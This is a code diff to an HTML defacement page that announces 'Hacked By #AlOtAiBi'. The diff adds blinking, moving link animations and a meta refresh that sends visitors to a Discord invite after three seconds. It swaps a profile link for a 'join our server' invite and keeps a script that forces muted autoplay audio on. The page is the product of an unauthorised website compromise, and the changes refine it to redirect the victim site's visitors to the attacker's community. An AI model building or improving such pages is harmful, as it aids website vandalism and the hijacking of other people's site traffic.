@@ -29,21 +29,31 @@
       text-shadow: 0 0 15px red;
     }
     a {
-      margin-top: 10px;
-      font-size: 20px;
+      margin-top: 15px;
+      font-size: 22px;
       color: #0f0;
       text-decoration: none;
       font-weight: bold;
+      display: inline-block;
+      animation: blink 1s infinite, move 2s infinite alternate;
     }
-    a:hover {
-      color: #fff;
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+    @keyframes move {
+      0% { transform: translateX(-10px); }
+      100% { transform: translateX(10px); }
     }
   </style>
+  <!-- تحويل تلقائي بعد 3 ثواني -->
+  <meta http-equiv="refresh" content="3; url=https://discord.gg/VTXgN9sHWE" />
 </head>
 <body>
   <img src="images.jfif" alt="الصورة" />
   <div class="text">Hacked By #AlOtAiBi</div>
-  <a href="https://guns.lol/aboatb" target="_blank">https://guns.lol/aboatb</a>
+  <a href="https://discord.gg/VTXgN9sHWE" target="_blank">إنضم لسيرفرنا 🚀</a>
 
   <audio id="music" src="https://files.catbox.moe/ohwtsa.mp3" autoplay loop muted></audio>
 
@@ -53,7 +63,7 @@
     let tryPlay = setInterval(() => {
       audio.muted = false;
       audio.play().then(() => {
-        clearInterval(tryPlay); // وقف المحاولات إذا اشتغل الصوت
+        clearInterval(tryPlay);
       }).catch(() => {});
     }, 1000);
   </script>
